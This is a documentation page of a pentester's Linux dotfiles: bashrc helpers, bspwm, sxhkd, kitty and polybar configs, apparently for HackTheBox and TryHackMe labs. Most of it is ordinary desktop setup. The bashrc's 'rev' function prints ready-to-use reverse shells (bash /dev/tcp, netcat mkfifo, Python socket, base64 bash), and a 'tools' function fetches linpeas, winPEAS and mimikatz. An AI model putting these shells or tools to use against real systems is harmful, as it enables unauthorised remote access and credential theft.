---
title: Configuración
description: Archivos de configuración del sistema y scripts
tags: [configuration, scripts]
lang: es
order: 99
parent: setup
---

## bash

### .bashrc

```bash
source $HOME/.config/colors/colors.sh

# If not running interactively, don't do anything
[[ $- != *i* ]] && return

alias ls='ls --color=auto'
alias grep='grep --color=auto'
alias burp='/usr/bin/burpsuite > /dev/null 2>&1 & disown'
alias fire='/usr/bin/firefox > /dev/null 2>&1 & disown'
alias wire='/usr/bin/wireshark > /dev/null 2>&1 & disown'
alias tor='/usr/bin/torbrowser-launcher > /dev/null 2>&1 & disown'
PS1='\[\e[32m\][ \[\e[0m\]\[\e[38;2;59;113;202m\]\w\[\e[0m\]\[\e[32m\] ]\[\e[0m\] \[\e[38;2;159;166;178m\] \[\e[0m\] '

# Sets or clears the target IP (and optional port) displayed in Polybar
target(){
    local target_file="$HOME/.config/polybar/scripts/target.txt"

    if [[ $# -eq 0 ]]; then
        # No arguments — clear the target
        echo "" > "$target_file"
    elif [[ $# -eq 1 ]]; then
        # Split IP and optional port
        local ip="${1%%:*}"
        local port="${1##*:}"
        [[ "$ip" == "$port" ]] && port=""

        # Validate IP format with regex
        if [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
            local valid=true
            # Validate each octet is between 0 and 255
            IFS='.' read -ra octets <<< "$ip"
            for octet in "${octets[@]}"; do
                if [[ $octet -gt 255 ]]; then
                    valid=false
                    break
                fi
            done

            # Validate port if provided
            if [[ -n "$port" ]] && ! [[ "$port" =~ ^[0-9]+$ && $port -ge 1 && $port -le 65535 ]]; then
              echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: invalid port (must be between 1 and 65535)"
                return 1
            fi

            if $valid; then
                echo "$1" > "$target_file"
            else
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: invalid IP (octets must be between 0 and 255)"
            fi
        else
            echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: '$ip' is not a valid IP address"
            echo -e "\nUsage: target [ip] or target [ip:port]"
            echo "  target 10.10.10.10        → set target IP in Polybar"
            echo "  target 10.10.10.10:8080   → set target IP and port in Polybar"
            echo "  target                    → clear target from Polybar"
            echo
        fi
    else
        echo -e "\nUsage: target [ip] or target [ip:port]"
        echo "  target 10.10.10.10        → set target IP in Polybar"
        echo "  target 10.10.10.10:8080   → set target IP and port in Polybar"
        echo "  target                    → clear target from Polybar"
    fi
}

# Extracts open ports from any nmap output file (.gnmap, .nmap, .xml)
ports(){
    local usage="Usage: ports <file>
  ports lookup.gnmap   → parses grepable nmap output
  ports lookup.nmap    → parses normal nmap output
  ports lookup.xml     → parses XML nmap output"

    if [[ $# -eq 0 ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: no file specified\n"
        echo "$usage"
        echo
        return 1
    fi

    if [[ $# -gt 1 ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: too many arguments\n"
        echo "$usage"
        echo
        return 1
    fi

    local file="$1"

    if [[ ! -f "$file" ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: '$file' is not a valid file\n"
        echo "$usage"
        echo
        return 1
    fi

    local result

    case "$file" in
        *.gnmap)
            result=$(grep -oP '\d{1,5}/open' "$file" | awk -F'/' '{print $1}' | sort -un | xargs | tr ' ' ',')
            ;;
        *.nmap)
            result=$(grep -oP '^\s*\d{1,5}/\w+\s+open' "$file" | grep -oP '^\s*\d+' | tr -d ' ' | sort -un | xargs | tr ' ' ',')
            ;;
        *.xml)
            result=$(grep 'state="open"' "$file" | grep -oP 'portid="\K\d+' | sort -un | xargs | tr ' ' ',')
            ;;
        *)
            echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: unrecognized file extension (expected .gnmap, .nmap or .xml)\n"
            echo "$usage"
            echo
            return 1
            ;;
    esac

    if [[ -z "$result" ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] No open ports found in '$file'\n"
        echo
        return 1
    fi

    echo "$result"

    if command -v xclip &>/dev/null; then
        echo -n "$result" | xclip -selection clipboard
    else
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] xclip not found — install it with: sudo pacman -S xclip"
        echo
    fi
}

# Obfuscates sensitive data (flags, passwords, users, etc.) and copies to clipboard
mask(){
    local partial=false

    if [[ "$1" == "-p" ]]; then
        partial=true
        shift
    fi

    if [[ $# -eq 0 ]]; then
        echo
        echo "Usage: mask [-p] <value>"
        echo "  mask <value>     → fully mask value"
        echo "  mask -p <value>  → partially mask, keeping some chars at start and end"
        echo
        return 1
    fi

    local input="$1"
    local len=${#input}
    local masked

    if $partial; then
        local visible

        if [[ $len -lt 6 ]]; then
            visible=0
        elif [[ $len -lt 11 ]]; then
            visible=1
        elif [[ $len -lt 21 ]]; then
            visible=2
        else
            visible=3
        fi

        if [[ $visible -eq 0 ]]; then
            masked=$(printf '%0.s*' $(seq 1 $len))
        else
            local start="${input:0:$visible}"
            local end="${input: -$visible}"
            local mid_len=$(( len - visible * 2 ))
            local mid
            mid=$(printf '%0.s*' $(seq 1 $mid_len))
            masked="${start}${mid}${end}"
        fi
    else
        masked=$(printf '%0.s*' $(seq 1 $len))
    fi
    
    echo
    echo "$masked"
    echo

    if command -v xclip &>/dev/null; then
        echo -n "$masked" | xclip -selection clipboard
    else
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] xclip not found — install it with: sudo pacman -S xclip\n"
    fi
}

# Python venv manager
venv(){
    local venv_dir="venv"
    local libs=()

    # Parse -l flag and collect libraries
    local args=()
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -l)
                shift
                while [[ $# -gt 0 && "$1" != -* ]]; do
                    libs+=("$1")
                    shift
                done
                ;;
            *) args+=("$1"); shift ;;
        esac
    done
    set -- "${args[@]}"

    case "$1" in
        -d)
            if [[ -z "$VIRTUAL_ENV" ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: no active virtual environment\n"
                return 1
            fi
            deactivate
            ;;
        -r)
            if [[ ! -d "$venv_dir" ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: no venv found in current directory\n"
                return 1
            fi
            if [[ -n "$VIRTUAL_ENV" ]]; then
                deactivate
            fi
            rm -rf "$venv_dir"
            echo -e "\n[${ANSI_SUCCESS}+${COLOR_RESET}] venv removed\n"
            ;;
        "")
            if [[ -d "$venv_dir" ]]; then
                source "$venv_dir/bin/activate"
                echo -e "\n[${ANSI_SUCCESS}+${COLOR_RESET}] venv activated\n"
            else
                python3 -m venv "$venv_dir"
                source "$venv_dir/bin/activate"
                echo -e "\n[${ANSI_SUCCESS}+${COLOR_RESET}] venv created and activated\n"
            fi

            if [[ ${#libs[@]} -gt 0 ]]; then
                echo -e "[${ANSI_SUCCESS}*${COLOR_RESET}] Installing libraries: ${libs[*]}\n"
                python3 -m pip install "${libs[@]}"
            fi
            ;;
        *)
            echo
            echo "Usage: venv [-d|-r] [-l lib1 lib2 ...]"
            echo "  venv                          → create venv if needed, then activate"
            echo "  venv -l requests flask        → create/activate and install libraries"
            echo "  venv -d                       → deactivate current venv"
            echo "  venv -r                       → deactivate (if active) and remove venv"
            echo
            return 1
            ;;
    esac
}

# Pentesting tools downloader
tools(){
    local usage="Usage: tools <tool> [arch]
  tools linpeas            → download linpeas.sh as lp.sh
  tools winpeas 32|64      → download winPEASx86.exe or winPEASx64.exe
  tools mimikatz 32|64     → extract and download mimikatz.exe (32 or 64 bit)
  tools enum4linux         → clone and setup enum4linux-ng"

    if [[ $# -eq 0 ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: no tool specified\n"
        echo "$usage"
        echo
        return 1
    fi

    case "$1" in
        linpeas)
            local url="https://github.com/peass-ng/PEASS-ng/releases/download/20260301-38d838d2/linpeas.sh"
            local output="lp.sh"
            if [[ -f "$output" ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] $output already exists in current directory\n"
                return 1
            fi
            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Downloading linpeas...\n"
            if curl -sL "$url" -o "$output"; then
                chmod +x "$output"
                echo -e "[${ANSI_SUCCESS}+${COLOR_RESET}] Saved as $output\n"
            else
                echo -e "[${ANSI_DANGER}-${COLOR_RESET}] Download failed\n"
                rm -f "$output"
                return 1
            fi
            ;;

        winpeas)
            if [[ -z "$2" || ( "$2" != "32" && "$2" != "64" ) ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: specify architecture: tools winpeas 32|64\n"
                return 1
            fi
            local url output
            if [[ "$2" == "32" ]]; then
                url="https://github.com/peass-ng/PEASS-ng/releases/download/20260301-38d838d2/winPEASx86.exe"
                output="winPEASx86.exe"
            else
                url="https://github.com/peass-ng/PEASS-ng/releases/download/20260301-38d838d2/winPEASx64.exe"
                output="winPEASx64.exe"
            fi
            if [[ -f "$output" ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] $output already exists in current directory\n"
                return 1
            fi
            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Downloading winPEAS ($2-bit)...\n"
            if curl -sL "$url" -o "$output"; then
                echo -e "[${ANSI_SUCCESS}+${COLOR_RESET}] Saved as $output\n"
            else
                echo -e "[${ANSI_DANGER}-${COLOR_RESET}] Download failed\n"
                rm -f "$output"
                return 1
            fi
            ;;

        mimikatz)
            if [[ -z "$2" || ( "$2" != "32" && "$2" != "64" ) ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: specify architecture: tools mimikatz 32|64\n"
                return 1
            fi
            local url="https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
            local zipfile="mimikatz_trunk.zip"
            local output="mimikatz.exe"
            if [[ -f "$output" ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] $output already exists in current directory\n"
                return 1
            fi
            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Downloading mimikatz...\n"
            if ! curl -sL "$url" -o "$zipfile"; then
                echo -e "\n[${ANSI_DANGER}-${COLOR_RESET}] Download failed\n"
                rm -f "$zipfile"
                return 1
            fi
            local inner_path
            if [[ "$2" == "32" ]]; then
                inner_path="Win32/mimikatz.exe"
            else
                inner_path="x64/mimikatz.exe"
            fi
            echo -e "[${ANSI_WARNING}*${COLOR_RESET}] Extracting $inner_path...\n"
            if unzip -p "$zipfile" "$inner_path" > "$output"; then
                rm -f "$zipfile"
                echo -e "[${ANSI_SUCCESS}+${COLOR_RESET}] Saved as $output\n"
            else
                echo -e "[${ANSI_DANGER}!${COLOR_RESET}] Extraction failed\n"
                rm -f "$zipfile" "$output"
                return 1
            fi
            ;;

        enum4linux)
            if [[ -d "enum4linux-ng" ]]; then
                echo -e "[${ANSI_DANGER}!${COLOR_RESET}] enum4linux-ng directory already exists\n"
                return 1
            fi
            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Cloning enum4linux-ng...\n"
            if ! git clone https://github.com/cddmp/enum4linux-ng.git; then
                echo -e "[${ANSI_DANGER}-${COLOR_RESET}] Clone failed\n"
                return 1
            fi
            cd enum4linux-ng || return 1
            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Setting up virtual environment..."
            if ! python3 -m venv venv; then
                echo -e "\n[${ANSI_DANGER}-${COLOR_RESET}] Failed to create venv — try: sudo pacman -S python-virtualenv\n"
                cd ..
                return 1
            fi
            if ! source venv/bin/activate; then
                echo -e "[${ANSI_DANGER}-${COLOR_RESET}] Failed to activate venv\n"
                cd ..
                return 1
            fi
            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Installing dependencies...\n"
            if ! python3 -m pip install wheel; then
                echo -e "\n[${ANSI_DANGER}-${COLOR_RESET}] Failed to install wheel\n"
                return 1
            fi
            if ! python3 -m pip install -r requirements.txt; then
                echo -e "\n[${ANSI_DANGER}-${COLOR_RESET}] Failed to install requirements\n"
                return 1
            fi
            echo -e "\n[${ANSI_SUCCESS}+${COLOR_RESET}] enum4linux-ng ready — venv activated\n"
            ;;
        *)
            echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: unknown tool '$1'\n"
            echo "$usage"
            echo
            return 1
            ;;
    esac
}

# VPN manager for HTB, HTB Academy and THM
vpn(){
    local config_dir="$HOME/.config/vpn"
    local usage="Usage: vpn -c <htb|htbc|htba|thm>
  vpn -c htb   → connect to HackTheBox
  vpn -c htbc  → connect to HackTheBox Competitive
  vpn -c htba  → connect to HackTheBox Academy
  vpn -c thm   → connect to TryHackMe"

    if [[ $# -eq 0 ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: no arguments provided"
        echo
        echo "$usage"
        echo
        return 1
    fi

    if [[ "$1" != "-c" ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: unknown flag '$1'"
        echo
        echo "$usage"
        echo
        return 1
    fi

    if [[ -z "$2" ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: no VPN specified"
        echo
        echo "$usage"
        echo
        return 1
    fi

    local config

    case "$2" in
        htb)  config="$config_dir/htb.ovpn"  ;;
        htbc) config="$config_dir/htbc.ovpn"  ;;
        htba) config="$config_dir/htba.ovpn" ;;
        thm)  config="$config_dir/thm.ovpn"  ;;
        *)
            echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: unknown VPN '$2' (expected htb, htba or thm)"
            echo
            echo "$usage"
            echo
            return 1
            ;;
    esac

    if [[ ! -f "$config" ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: config file not found at '$config'\n"
        return 1
    fi

    echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Connecting to $2 VPN...\n"
    sudo openvpn --config "$config"
}

# Copies file contents to clipboard
clip(){
    if [[ $# -eq 0 ]]; then
        echo
        echo -e "Usage: clip <file>"
        echo
        return 1
    fi

    if [[ ! -f "$1" ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: '$1' is not a valid file\n"
        return 1
    fi

    if ! command -v xclip &>/dev/null; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] xclip not found — install it with: sudo pacman -S xclip\n"
        return 1
    fi

    xclip -sel clip < "$1"
    echo -e "\n[${ANSI_SUCCESS}+${COLOR_RESET}] '$1' copied to clipboard\n"
}

# Generates reverse shells for a given attacker IP and port
rev(){
    local usage="Usage: rev <ip> <port>
  rev 10.10.15.113 4444  → print ready-to-use reverse shells"

    if [[ $# -ne 2 ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: expected 2 arguments\n"
        echo "$usage"
        echo
        return 1
    fi

    local ip="$1"
    local port="$2"

    # Validate IP
    if ! [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}]Error: '$ip' is not a valid IP address\n"
        return 1
    fi

    # Validate port
    if ! [[ "$port" =~ ^[0-9]+$ ]] || [[ $port -lt 1 || $port -gt 65535 ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: '$port' is not a valid port (1-65535)\n"
        return 1
    fi

    # Base64 reverse shell
    local b64
    b64=$(echo "bash -i >& /dev/tcp/${ip}/${port} 0>&1" | base64 | tr -d '\n')

    echo ""
    echo -e "━━━ ${ANSI_SUCCESS}Bash${COLOR_RESET} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "bash -c \"bash -i >& /dev/tcp/${ip}/${port} 0>&1\""

    echo ""
    echo -e "━━━ ${ANSI_SUCCESS}Bash URL-encoded${COLOR_RESET} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "bash+-c+\"bash+-i+>%26+/dev/tcp/${ip}/${port}+0>%261\""

    echo ""
    echo -e "━━━ ${ANSI_SUCCESS}Netcat (mkfifo)${COLOR_RESET} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f"

    echo ""
    echo -e "━━━ ${ANSI_SUCCESS}Python${COLOR_RESET} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${ip}\",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

    echo ""
    echo -e "━━━ ${ANSI_SUCCESS}Base64${COLOR_RESET} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "echo ${b64} | base64 -d | bash"
    echo ""
}

# Wordlist manager — save and display frequently used SecLists paths
lists(){
    local store="$HOME/.config/wordlists.txt"
    local usage="Usage: lists [-l <path>] [-r <path>]
  lists              → show all saved wordlists
  lists -l <path>    → add a wordlist path
  lists -r <path>    → remove a wordlist path"

    # Create store file if it doesn't exist
    [[ ! -f "$store" ]] && touch "$store"

    case "$1" in
        "")
            if [[ ! -s "$store" ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] No wordlists saved yet. Use: lists -l <path>\n"
                return 0
            fi
            echo ""
            echo -e "━━━ ${ANSI_SUCCESS}Saved wordlists${COLOR_RESET} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            local i=1
            while IFS= read -r line; do
                echo -e "[${ANSI_WARNING}$i${COLOR_RESET}] $line"
                (( i++ ))
            done < "$store"
            echo ""
            ;;
        -l)
            if [[ -z "$2" ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: no path provided\n"
                echo "$usage"
                echo
                return 1
            fi
            local path="$2"
            if [[ ! -f "$path" ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: '$path' does not exist\n"
                return 1
            fi
            if grep -qxF "$path" "$store"; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] '$path' is already saved\n"
                return 0
            fi
            echo "$path" >> "$store"
            echo -e "\n[${ANSI_SUCCESS}+${COLOR_RESET}] Added: $path\n"
            ;;
        -r)
            if [[ -z "$2" ]]; then
                echo -e "[${ANSI_DANGER}!${COLOR_RESET}] Error: no path provided\n"
                echo
                echo "$usage"
                return 1
            fi
            if ! grep -qxF "$2" "$store"; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: '$2' not found in saved lists\n"
                return 1
            fi
            grep -vxF "$2" "$store" > "${store}.tmp"; mv "${store}.tmp" "$store"
            echo -e "\n[${ANSI_SUCCESS}-${COLOR_RESET}] Removed: $2\n"
            ;;
        *)
            echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: unknown flag '$1'\n"
            echo "$usage"
            echo
            return 1
            ;;
    esac
}
```

## bspwm

### bspwmrc

```bash
#!/bin/sh

pgrep -x sxhkd > /dev/null || sxhkd &

bspc monitor DP-0 -d I II III IV V
bspc monitor HDMI-0 -d VI VII VIII IX X

bspc config border_width         1
bspc config window_gap          10

bspc config split_ratio          0.5
bspc config borderless_monocle   true
bspc config gapless_monocle      true

xset r rate 250 25

source $HOME/.config/polybar/env.sh
$HOME/.config/polybar/launch.sh &
```

## bspwm_resize.sh

```bash
#!/usr/bin/env sh

if bspc query -N -n focused.floating > /dev/null; then
	step=20
else
	step=100
fi

case "$1" in
	west) dir=right; falldir=left; x="-$step"; y=0;;
	east) dir=right; falldir=left; x="$step"; y=0;;
	north) dir=top; falldir=bottom; x=0; y="-$step";;
	south) dir=top; falldir=bottom; x=0; y="$step";;
esac

bspc node -z "$dir" "$x" "$y" || bspc node -z "$falldir" "$x" "$y"
```

## sxhkd

### sxhkdrc

```bash
# terminal emulator
super + Return
	/usr/bin/kitty

# make sxhkd reload its configuration files:
super + Escape
	pkill -USR1 -x sxhkd

# quit/restart bspwm
super + alt + {q,r}
	bspc {quit,wm -r}

# close and kill
super + {_,shift + }w
	bspc node -{c,k}

# alternate between the tiled and monocle layout
super + m
	bspc desktop -l next

# send the newest marked node to the newest preselected node
super + y
	bspc node newest.marked.local -n newest.!automatic.local

# swap the current node and the biggest window
super + g
	bspc node -s biggest.window

# set the window state
super + {t,shift + t,s,f}
	bspc node -t {tiled,pseudo_tiled,floating,fullscreen}

# set the node flags
super + ctrl + {m,x,y,z}
	bspc node -g {marked,locked,sticky,private}

# focus the node in the given direction
super + {_,shift + }{Left,Down,Up,Right}
	bspc node -{f,s} {west,south,north,east}

# focus the node for the given path jump
super + {p,b,comma,period}
	bspc node -f @{parent,brother,first,second}

# focus the next/previous window in the current desktop
super + {_,shift + }c
	bspc node -f {next,prev}.local.!hidden.window

# focus the next/previous desktop in the current monitor
super + bracket{left,right}
	bspc desktop -f {prev,next}.local

# focus the last node/desktop
super + {grave,Tab}
	bspc {node,desktop} -f last

# focus the older or newer node in the focus history
super + {o,i}
	bspc wm -h off; \
	bspc node {older,newer} -f; \
	bspc wm -h on

# focus or send to the given desktop
super + {_,shift + }{1-9,0}
	bspc {desktop -f,node -d} '^{1-9,10}'

# preselect the direction
super + ctrl + {h,j,k,l}
	bspc node -p {west,south,north,east}

# preselect the ratio
super + ctrl + {1-9}
	bspc node -o 0.{1-9}

# cancel the preselection for the focused node
super + ctrl + space
	bspc node -p cancel

# cancel the preselection for the focused desktop
super + ctrl + shift + space
	bspc query -N -d | xargs -I id -n 1 bspc node id -p cancel

# move a floating window
super + {Left,Down,Up,Right}
	bspc node -v {-20 0,0 20,0 -20,20 0}

# custom resize
super + alt + {Left,Down,Up,Right}
	$HOME/.config/bspwm/scripts/bspwm_resize.sh {west,south,north,east}

# flameshot
super + shift + alt + f
  /usr/bin/flameshot gui

XF86AudioRaiseVolume
    wpctl set-volume @DEFAULT_AUDIO_SINK@ 1%+

XF86AudioLowerVolume
    wpctl set-volume @DEFAULT_AUDIO_SINK@ 1%-

XF86AudioMute
    wpctl set-mute @DEFAULT_AUDIO_SINK@ toggle
```

## kitty

### kitty.conf

```bash
window_margin_width 5
single_window_margin_width 0
window_padding_width 5
single_window_padding_width 4 6

font_size 14

map ctrl+shift+enter new_window_with_cwd
map ctrl+shift+t new_tab_with_cwd

map ctrl+left neighboring_window left
map ctrl+right neighboring_window right
map ctrl+up neighboring_window up
map ctrl+down neighboring_window down

map f1 copy_to_buffer a
map f2 paste_from_buffer a
map f3 copy_to_buffer b
map f4 paste_from_buffer b
map f5 copy_to_buffer c
map f6 paste_from_buffer c
map f7 copy_to_buffer d
map f8 paste_from_buffer d
map f9 copy_to_buffer e
map f10 paste_from_buffer e

map ctrl+shift+z toggle_layout stack

enable_audio_bell no
```

## polybar

### launch.sh

```bash
#!/bin/bash

killall -q polybar

polybar main 2>&1 | tee -a /tmp/polybar.log & disown
```

## config.ini

```bash
include-file = $HOME/.config/colors/colors.ini

[bar/main]
modules-left = shutdown reboot logout lock date vpn target desk
modules-right = audio kitty vsc tor wire fire burp dog
width = 98%
offset-x = 1%
offset-y = 10
padding = 1
module-margin = 1
font-0 = Adwaita-Sans:size=14;3
font-1 = Hack Nerd Font:size=14;3
cursor-click = pointer
cursor-scroll = ns-resize

[module/shutdown]
type = custom/text
label = " 󰤆 "
label-foreground = ${colors.danger}
click-left = /usr/bin/poweroff

[module/reboot]
type = custom/text
label = "  "
label-foreground = ${colors.orange}
click-left = /usr/bin/reboot

[module/logout]
type = custom/text
label = "  "
label-foreground = ${colors.warning}
click-left = bspc quit

[module/lock]
type = custom/text
label = " 󰌾 "
label-foreground = ${colors.secondary}
click-left = /usr/bin/i3lock-fancy

[module/date]
type = internal/date
interval = 1.0
time = %H:%M
time-alt = %H:%M:%S
format = <label>
label = %time%
label-foreground = ${colors.pink}

[module/vpn]
type = custom/script
exec = $HOME/.config/polybar/scripts/vpn.sh
click-left = echo -n "$(ip a show tun0 | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+')" | xclip -sel clip
interval = 2
format = <label>
label-foreground = ${colors.primary}

[module/target]
type = custom/script
exec = $HOME/.config/polybar/scripts/target.sh
click-left = echo -n "$(cat $HOME/.config/polybar/scripts/target.txt)" | xclip -sel clip
interval = 2
format = <label>
label-foreground = ${colors.danger}

[module/desk]
type = internal/xworkspaces
label-empty-foreground = ${colors.secondary}
label-active-foreground = ${colors.success}
label-occupied-foreground = ${colors.warning}

[module/audio]
type = internal/pulseaudio
interval = 1
format-volume = <label-volume>
label-volume = ${env:MAIN_AUDIO_LABEL}
format-muted = <label-muted>
label-muted = ${env:MAIN_MUTED_LABEL}
click-right = $HOME/.config/polybar/scripts/audio-switch.sh

[module/dog]
type = custom/text
label = ${env:MAIN_DOG_LABEL}

[module/fire]
type = custom/text
label = ${env:MAIN_FIRE_LABEL}
click-left = /usr/bin/firefox > /dev/null 2>&1 & disown

[module/burp]
type = custom/text
label = ${env:MAIN_BURP_LABEL}
click-left = /usr/bin/burpsuite > /dev/null 2>&1 & disown

[module/wire]
type = custom/text
label = ${env:MAIN_WIRE_LABEL}
click-left = /usr/bin/wireshark > /dev/null 2>&1 & disown

[module/tor]
type = custom/text
label = ${env:MAIN_TOR_LABEL}
click-left = /usr/bin/torbrowser-launcher > /dev/null 2>&1 & disown

[module/vsc]
type = custom/text
label = ${env:MAIN_VSC_LABEL}
click-left = /usr/bin/code > /dev/null 2>&1 & disown

[module/kitty]
type = custom/text
label = ${env:MAIN_KITTY_LABEL}
click-left = bash -c 'umask 022; exec /usr/bin/kitty'
```

## env.sh

```bash
source $HOME/.config/colors/colors.sh

export MAIN_DOG_LABEL="[%{F$COLOR_DOG} 󰩃  %{F-}]"
export MAIN_FIRE_LABEL="(%{F$COLOR_DANGER} F %{F-})"
export MAIN_BURP_LABEL="(%{F$COLOR_ORANGE} B %{F-})"
export MAIN_WIRE_LABEL="(%{F$COLOR_PRIMARY} W %{F-})"
export MAIN_TOR_LABEL="(%{F$COLOR_PURPLE} T %{F-})"
export MAIN_VSC_LABEL="(%{F$COLOR_PRIMARY} V %{F-})"
export MAIN_KITTY_LABEL="(%{F$COLOR_SUCCESS} K %{F-})"
export MAIN_AURIS_LABEL="[%{F$COLOR_WARNING} 󰋋%{F-}  %{F$COLOR_ORANGE}%percentage% %{F-}]"
export MAIN_SPEAKERS_LABEL="[%{F$COLOR_WARNING} 󰕾%{F-}  %{F$COLOR_ORANGE}%percentage% %{F-}]"
export MAIN_MUTED_LABEL="[ %{F$COLOR_DANGER} 󰝟 %{F-} ]"
export MAIN_AUDIO_LABEL=$MAIN_SPEAKERS_LABEL
```

## audio-switch.sh

```bash
#!/usr/bin/env bash

ENV_FILE="$HOME/.config/polybar/env.sh"

CURRENT=$(wpctl status | awk '/Sinks:/ { in_sinks=1; next } /Sources:/ { in_sinks=0 } in_sinks && /\*/ { for(i=1;i<=NF;i++) if($i=="*") { print $(i+1); break } }' | tr -d '.')

SINKS=($(wpctl status | awk '/Sinks:/ { in_sinks=1; next } /Sources:/ { in_sinks=0 } in_sinks && /[0-9]+\./ && !/HDMI/ { for(i=1;i<=NF;i++) if($i ~ /^[0-9]+\.$/) { print $i; break } }' | tr -d '.'))

for i in "${!SINKS[@]}"; do
    if [[ "${SINKS[$i]}" == "$CURRENT" ]]; then
        NEXT=$(( (i + 1) % ${#SINKS[@]} ))
        wpctl set-default "${SINKS[$NEXT]}"
        break
    fi
done

ACTIVE_SINK=$(wpctl status | awk '/Sinks:/ { in_sinks=1; next } /Sources:/ { in_sinks=0 } in_sinks && /\*/')

echo "ACTIVE_SINK >>> $ACTIVE_SINK"

if echo "$ACTIVE_SINK" | grep -q "Razer"; then
    sed -i 's|export MAIN_AUDIO_LABEL=.*|export MAIN_AUDIO_LABEL=$MAIN_AURIS_LABEL|' "$ENV_FILE"
else
    sed -i 's|export MAIN_AUDIO_LABEL=.*|export MAIN_AUDIO_LABEL=$MAIN_SPEAKERS_LABEL|' "$ENV_FILE"
fi

source $ENV_FILE

$HOME/.config/polybar/launch.sh &
```

## target.sh

```bash
#!/bin/bash

ip_address=$(/bin/cat $HOME/.config/polybar/scripts/target.txt)

if [ -n "$ip_address" ]; then
  echo "$ip_address"
else
  echo ""
fi
```

## vpn.sh

```bash
#!/bin/sh

IFACE=$(ip -o link show | awk -F': ' '/tun0/ {print $2}')

if [ "$IFACE" = "tun0" ]; then
  echo "$(ip a show tun0 | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+')"
else
  echo ""
fi
```

## colors

### colors.ini

```bash
[colors]
primary   = #3B71CA
secondary = #9FA6B2
success   = #14A44D
danger    = #DC4C64
warning   = #E4A11B
info      = #54B4D3
light     = #FBFBFB
dark      = #332D2D
pink      = #C2527A
purple    = #7952B3
dog       = #C68642
orange    = #E8703A
```

### colors.py

```bash
PRIMARY   = "#3B71CA"
SECONDARY = "#9FA6B2"
SUCCESS   = "#14A44D"
DANGER    = "#DC4C64"
WARNING   = "#E4A11B"
INFO      = "#54B4D3"
LIGHT     = "#FBFBFB"
DARK      = "#332D2D"
PINK      = "#C2527A"
PURPLE    = "#7952B3"
DOG       = "#C68642"
ORANGE    = "#E8703A"
```

### colors.sh

```bash
COLOR_PRIMARY="#3B71CA"
COLOR_SECONDARY="#9FA6B2"
COLOR_SUCCESS="#14A44D"
COLOR_DANGER="#DC4C64"
COLOR_WARNING="#E4A11B"
COLOR_INFO="#54B4D3"
COLOR_LIGHT="#FBFBFB"
